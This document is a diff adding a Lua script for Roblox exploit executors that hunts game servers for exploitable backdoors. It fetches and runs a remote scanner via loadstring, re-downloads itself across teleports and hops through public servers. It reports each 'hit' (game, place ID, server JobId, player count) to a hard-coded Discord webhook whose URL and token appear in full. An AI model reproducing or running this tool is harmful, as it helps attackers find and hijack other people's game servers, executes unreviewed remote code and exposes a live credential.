@@ -1,0 +1,312 @@
+-- [ CONFIGURATION ] --
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakad10"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" -- REPLACE THIS
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    -- [ CORE SERVICES ] --
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- [ SCRIPT GLOBALS ] --
+    local found_success = false
+    local scan_completed = false
+    local fileName = "NotSameServers.json"
+    local currentJobId = tostring(game.JobId)
+    local placeId = game.PlaceId
+    local webhook = "]===] .. webhook_url .. [===["
+    local gameName = "Unknown Game"
+    
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(placeId).Name
+    end)
+
+    -- [ ANTI-AFK SYSTEM ] --
+    task.spawn(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        game:GetService("Players").LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+            print("Anti-AFK: Prevented Disconnect")
+        end)
+    end)
+
+    -- [ UI CONSTRUCTION - INDUSTRIAL GRADE ] --
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "Scanner_Ultra_v5"
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = CoreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 350, 0, 180)
+    mainFrame.Position = UDim2.new(1, -360, 1, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 6)
+    uiCorner.Parent = mainFrame
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(0, 255, 150)
+    mainStroke.Thickness = 2
+    mainStroke.Parent = mainFrame
+
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 6)
+
+    local titleText = Instance.new("TextLabel")
+    titleText.Size = UDim2.new(1, -10, 1, 0)
+    titleText.Position = UDim2.new(0, 10, 0, 0)
+    titleText.Text = "PERSISTENT BACKDOOR ANALYZER v5.0"
+    titleText.TextColor3 = Color3.fromRGB(0, 255, 150)
+    titleText.BackgroundTransparency = 1
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 13
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.Parent = titleBar
+
+    local statusFrame = Instance.new("Frame")
+    statusFrame.Size = UDim2.new(1, -20, 0, 60)
+    statusFrame.Position = UDim2.new(0, 10, 0, 40)
+    statusFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    statusLabel = Instance.new("TextLabel", statusFrame)
+    statusLabel.Size = UDim2.new(1, -10, 0, 30)
+    statusLabel.Position = UDim2.new(0, 5, 0, 0)
+    statusLabel.Text = "STATUS: INITIALIZING SYSTEM..."
+    statusLabel.TextColor3 = Color3.new(1, 1, 1)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Font = Enum.Font.GothamSemibold
+    statusLabel.TextSize = 12
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Parent = statusFrame
+
+    local progressBarBack = Instance.new("Frame", statusFrame)
+    progressBarBack.Size = UDim2.new(1, -10, 0, 4)
+    progressBarBack.Position = UDim2.new(0, 5, 0, 35)
+    progressBarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    progressBarBack.BorderSizePixel = 0
+
+    local progressBar = Instance.new("Frame", progressBarBack)
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+    progressBar.BorderSizePixel = 0
+
+    local logContainer = Instance.new("ScrollingFrame")
+    logContainer.Size = UDim2.new(1, -20, 0, 60)
+    logContainer.Position = UDim2.new(0, 10, 0, 110)
+    logContainer.BackgroundTransparency = 1
+    logContainer.CanvasSize = UDim2.new(0, 0, 5, 0)
+    logContainer.ScrollBarThickness = 2
+    logContainer.Parent = mainFrame
+
+    local logLayout = Instance.new("UIListLayout", logContainer)
+    logLayout.Padding = UDim.new(0, 2)
+
+    local function createLog(txt, color)
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1, 0, 0, 15)
+        l.BackgroundTransparency = 1
+        l.Text = "> " .. txt
+        l.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+        l.Font = Enum.Font.Code
+        l.TextSize = 10
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        l.Parent = logContainer
+        logContainer.CanvasPosition = Vector2.new(0, 9999)
+    end
+
+    -- [ PERSISTENCE LAYER ] --
+    local function loadDatabase()
+        createLog("Accessing workspace database...", Color3.new(1, 1, 1))
+        local ok, data = pcall(function()
+            if isfile(fileName) then
+                return HttpService:JSONDecode(readfile(fileName))
+            end
+        end)
+        if ok and type(data) == "table" then 
+            createLog("Database loaded successfully.", Color3.fromRGB(0, 255, 0))
+            return data 
+        end
+        createLog("No database found. Creating new entry.", Color3.fromRGB(255, 255, 0))
+        return {os.date("!*t").hour}
+    end
+
+    local AllIDs = loadDatabase()
+
+    local function saveDatabase()
+        local ok, err = pcall(function()
+            writefile(fileName, HttpService:JSONEncode(AllIDs))
+        end)
+        if not ok then createLog("Critical: Write Error: " .. tostring(err), Color3.new(1, 0, 0)) end
+    end
+
+    local function blacklistServer(id)
+        local sid = tostring(id)
+        for _, v in pairs(AllIDs) do if v == sid then return end end
+        table.insert(AllIDs, sid)
+        saveDatabase()
+        createLog("Blacklisted: " .. string.sub(sid, 1, 8), Color3.fromRGB(150, 150, 150))
+    end
+
+    blacklistServer(currentJobId)
+
+    -- [ WEBHOOK PROTOCOL ] --
+    local function fireWebhook(msg)
+        if webhook == "" or webhook == "YOUR_WEBHOOK_HERE" then 
+            createLog("Webhook skipped: URL not set.", Color3.fromRGB(255, 100, 0))
+            return 
+        end
+        
+        local data = {
+            ["username"] = "Analyzer Bot",
+            ["embeds"] = {{
+                ["title"] = "🎯 TARGET ACQUIRED - BACKDOOR FOUND",
+                ["description"] = msg,
+                ["color"] = 16711680,
+                ["fields"] = {
+                    {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "Place ID", ["value"] = tostring(placeId), ["inline"] = true},
+                    {["name"] = "Server JobId", ["value"] = "```lua\n" .. currentJobId .. "```", ["inline"] = false},
+                    {["name"] = "Player Count", ["value"] = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, ["inline"] = true}
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+
+        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+        if request then
+            pcall(function()
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(data)
+                })
+            end)
+            createLog("Webhook transmitted to Discord.", Color3.fromRGB(0, 200, 255))
+        end
+    end
+
+    -- [ SCANNING PROTOCOL ] --
+    local logConnection
+    logConnection = LogService.MessageOut:Connect(function(msg)
+        local low = msg:lower()
+        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then
+            found_success = true
+        end
+        if string.find(low, "complete") or string.find(low, "finished") or string.find(low, "done") then
+            scan_completed = true
+        end
+    end)
+
+    createLog("Initializing Loadstring Injection...", Color3.new(1, 1, 1))
+    local load_ok, load_err = pcall(function()
+        loadstring(game:HttpGet("]===] .. script_url .. [===["))()
+    end)
+
+    if not load_ok then
+        statusLabel.Text = "LOADSTRING CRITICAL ERROR"
+        createLog("Error: " .. tostring(load_err), Color3.new(1, 0, 0))
+        return
+    end
+
+    local timeout = 0
+    local max_timeout = 40
+    while timeout < max_timeout do
+        if found_success then break end
+        if scan_completed and timeout > 5 then break end
+        
+        timeout = timeout + 1
+        local perc = timeout / max_timeout
+        progressBar.Size = UDim2.new(perc, 0, 1, 0)
+        statusLabel.Text = "ANALYZING NETWORK... [" .. timeout .. "s]"
+        task.wait(1)
+    end
+    logConnection:Disconnect()
+
+    -- [ FINAL DECISION TREE ] --
+    if found_success then
+        statusLabel.Text = "SAFE: NO REMOTES. HOPPING..."
+        createLog("Condition 'Safe' met. Initiating Hop.", Color3.fromRGB(255, 200, 0))
+        
+        local function executeHop()
+            local queue = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            if queue then
+                pcall(function() queue(game:HttpGet("]===] .. self_url .. [===[")) end)
+            end
+
+            local cursor = ""
+            while true do
+                createLog("Requesting Server List...", Color3.fromRGB(150, 150, 150))
+                local api = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+                if cursor ~= "" then api = api .. "&cursor=" .. cursor end
+                
+                local s, r = pcall(function() return game:HttpGet(api) end)
+                if s and r then
+                    local decoded = HttpService:JSONDecode(r)
+                    if decoded and decoded.data then
+                        if decoded.nextPageCursor then cursor = decoded.nextPageCursor end
+                        
+                        for _, srv in pairs(decoded.data) do
+                            local id = tostring(srv.id)
+                            if srv.playing < srv.maxPlayers and id ~= currentJobId then
+                                local visited = false
+                                for _, ex in pairs(AllIDs) do if id == ex then visited = true break end end
+                                
+                                if not visited then
+                                    createLog("New Target Found: " .. string.sub(id, 1, 8), Color3.new(1, 1, 1))
+                                    blacklistServer(id)
+                                    statusLabel.Text = "TELEPORTING..."
+                                    task.wait(0.5)
+                                    TeleportService:TeleportToPlaceInstance(placeId, id, LocalPlayer)
+                                    task.wait(5)
+                                end
+                            end
+                        end
+                    end
+                else
+                    createLog("API Rate Limit. Waiting 10s...", Color3.new(1, 0, 0))
+                    task.wait(10)
+                end
+                task.wait(1)
+            end
+        end
+        executeHop()
+    else
+        statusLabel.Text = "!!! HIT DETECTED !!!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        mainStroke.Color = Color3.fromRGB(255, 0, 0)
+        titleText.Text = "CRITICAL: BACKDOOR DETECTED"
+        createLog("HIT: Safety phrase never found.", Color3.new(1, 0, 0))
+        
+        fireWebhook("Automated hit! Scanner found no safety confirmation in this server.")
+        
+        -- Flash effect
+        task.spawn(function()
+            while true do
+                mainStroke.Transparency = 0
+                task.wait(0.5)
+                mainStroke.Transparency = 1
+                task.wait(0.5)
+            end
+        end)
+    end
+]===]
+
+loadstring(FinalScript)()
